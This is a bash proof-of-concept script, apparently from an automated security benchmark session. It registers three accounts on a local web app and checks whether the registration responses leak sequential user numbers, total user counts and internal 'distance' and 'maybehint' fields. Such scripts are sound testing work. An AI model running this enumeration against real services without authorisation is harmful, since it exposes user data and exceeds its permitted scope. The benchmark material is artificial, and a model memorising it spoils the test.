#!/bin/bash
# POC: Demonstrates user enumeration via sequential user numbers and distance metrics exposed in registration endpoint responses with improved debugging
# Target: ./repo
# Created: 2025-12-01T16:11:29.857Z
# Session: benchmark-XBEN-099-24-minc74t1

# User Enumeration via Sequential User Numbers and Distance Metrics POC - Version 2
# This script demonstrates how the registration endpoint exposes sensitive 
# information through userNumber, total user count, distance, and maybehint fields

TARGET="${1:-http://localhost:3000}"
REGISTER_ENDPOINT="$TARGET/register"

echo "=========================================="
echo "User Enumeration POC - Sequential Numbers"
echo "=========================================="
echo "Target: $TARGET"
echo "Endpoint: $REGISTER_ENDPOINT"
echo ""

# First, test if server is reachable
echo "[*] Testing server connectivity..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET")
if [ "$HTTP_CODE" = "000" ]; then
  echo "[!] ERROR: Cannot reach target server at $TARGET"
  echo "[!] Please ensure the application is running on $TARGET"
  exit 1
fi
echo "[+] Server is reachable (HTTP $HTTP_CODE)"
echo ""

# Test 1: Initial registration to establish baseline
echo "[*] Test 1: First registration attempt"
TIMESTAMP=$(date +%s%N)
USER1="testuser_${TIMESTAMP}_1"
echo "[*] Registering: $USER1"

RESPONSE1=$(curl -s -X POST "$REGISTER_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${USER1}&password=TestPassword123")

echo "[*] Response 1 (Raw):"
echo "$RESPONSE1"
echo ""
echo "[*] Response 1 (JSON formatted):"
echo "$RESPONSE1" | jq . 2>/dev/null || echo "$RESPONSE1"
echo ""

# Test 2: Second registration
echo "[*] Test 2: Second registration attempt"
USER2="testuser_${TIMESTAMP}_2"
echo "[*] Registering: $USER2"

RESPONSE2=$(curl -s -X POST "$REGISTER_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${USER2}&password=TestPassword123")

echo "[*] Response 2 (Raw):"
echo "$RESPONSE2"
echo ""
echo "[*] Response 2 (JSON formatted):"
echo "$RESPONSE2" | jq . 2>/dev/null || echo "$RESPONSE2"
echo ""

# Test 3: Third registration
echo "[*] Test 3: Third registration attempt"
USER3="testuser_${TIMESTAMP}_3"
echo "[*] Registering: $USER3"

RESPONSE3=$(curl -s -X POST "$REGISTER_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${USER3}&password=TestPassword123")

echo "[*] Response 3 (Raw):"
echo "$RESPONSE3"
echo ""
echo "[*] Response 3 (JSON formatted):"
echo "$RESPONSE3" | jq . 2>/dev/null || echo "$RESPONSE3"
echo ""

# Extract information from responses
USER_NUMBER_1=$(echo "$RESPONSE1" | jq -r '.userNumber // empty' 2>/dev/null)
TOTAL_USERS_1=$(echo "$RESPONSE1" | jq -r '.message // empty' 2>/dev/null | grep -oP 'Total users: \K[0-9]+' || echo "")
DISTANCE_1=$(echo "$RESPONSE1" | jq -r '.distance // empty' 2>/dev/null)

USER_NUMBER_2=$(echo "$RESPONSE2" | jq -r '.userNumber // empty' 2>/dev/null)
TOTAL_USERS_2=$(echo "$RESPONSE2" | jq -r '.message // empty' 2>/dev/null | grep -oP 'Total users: \K[0-9]+' || echo "")
DISTANCE_2=$(echo "$RESPONSE2" | jq -r '.distance // empty' 2>/dev/null)

USER_NUMBER_3=$(echo "$RESPONSE3" | jq -r '.userNumber // empty' 2>/dev/null)
TOTAL_USERS_3=$(echo "$RESPONSE3" | jq -r '.message // empty' 2>/dev/null | grep -oP 'Total users: \K[0-9]+' || echo "")
DISTANCE_3=$(echo "$RESPONSE3" | jq -r '.distance // empty' 2>/dev/null)
MAYBEHINT=$(echo "$RESPONSE3" | jq -r '.maybehint // empty' 2>/dev/null)

echo "=========================================="
echo "EXTRACTED DATA"
echo "=========================================="
echo "[+] Response 1:"
echo "    - userNumber: $USER_NUMBER_1"
echo "    - Total users: $TOTAL_USERS_1"
echo "    - Distance: $DISTANCE_1"
echo ""
echo "[+] Response 2:"
echo "    - userNumber: $USER_NUMBER_2"
echo "    - Total users: $TOTAL_USERS_2"
echo "    - Distance: $DISTANCE_2"
echo ""
echo "[+] Response 3:"
echo "    - userNumber: $USER_NUMBER_3"
echo "    - Total users: $TOTAL_USERS_3"
echo "    - Distance: $DISTANCE_3"
echo "    - maybehint: $MAYBEHINT"
echo ""

# Vulnerability Detection
VULNS_FOUND=0

echo "=========================================="
echo "VULNERABILITY DETECTION"
echo "=========================================="

# Check if userNumbers are sequential and exposed
if [ ! -z "$USER_NUMBER_1" ] && [ ! -z "$USER_NUMBER_2" ] && [ ! -z "$USER_NUMBER_3" ]; then
  echo "[!] VULNERABILITY: Sequential userNumbers Exposed"
  echo "    User 1 received userNumber: $USER_NUMBER_1"
  echo "    User 2 received userNumber: $USER_NUMBER_2"
  echo "    User 3 received userNumber: $USER_NUMBER_3"
  echo "    Impact: Attackers can enumerate all user IDs sequentially"
  VULNS_FOUND=$((VULNS_FOUND + 1))
  echo ""
fi

# Check if total user count is disclosed
if [ ! -z "$TOTAL_USERS_1" ] && [ ! -z "$TOTAL_USERS_2" ] && [ ! -z "$TOTAL_USERS_3" ]; then
  echo "[!] VULNERABILITY: Total User Count Disclosed"
  echo "    Total users revealed in responses: $TOTAL_USERS_1 -> $TOTAL_USERS_2 -> $TOTAL_USERS_3"
  echo "    Impact: System leaks exact number of registered users"
  VULNS_FOUND=$((VULNS_FOUND + 1))
  echo ""
fi

# Check if distance field is exposed
if [ ! -z "$DISTANCE_1" ] || [ ! -z "$DISTANCE_2" ] || [ ! -z "$DISTANCE_3" ]; then
  echo "[!] VULNERABILITY: Distance Field Exposed"
  echo "    Distance values: $DISTANCE_1, $DISTANCE_2, $DISTANCE_3"
  echo "    Impact: Internal targeting metrics revealed"
  VULNS_FOUND=$((VULNS_FOUND + 1))
  echo ""
fi

# Check if maybehint field is exposed
if [ ! -z "$MAYBEHINT" ]; then
  echo "[!] VULNERABILITY: maybehint Field Exposed"
  echo "    maybehint value: $MAYBEHINT"
  echo "    Impact: Additional internal logic disclosed"
  VULNS_FOUND=$((VULNS_FOUND + 1))
  echo ""
fi

echo "=========================================="
echo "SUMMARY"
echo "=========================================="
echo "[*] Vulnerabilities Detected: $VULNS_FOUND"
echo "[*] This confirms user enumeration via sequential user numbers"
echo "[*] and distance metrics in registration endpoint responses"
echo "=========================================="

# Exit with success if vulnerabilities were found
if [ $VULNS_FOUND -gt 0 ]; then
  exit 0
else
  echo "[!] WARNING: No vulnerabilities detected in responses"
  echo "[!] This may indicate the application doesn't expose these fields"
  exit 1
fi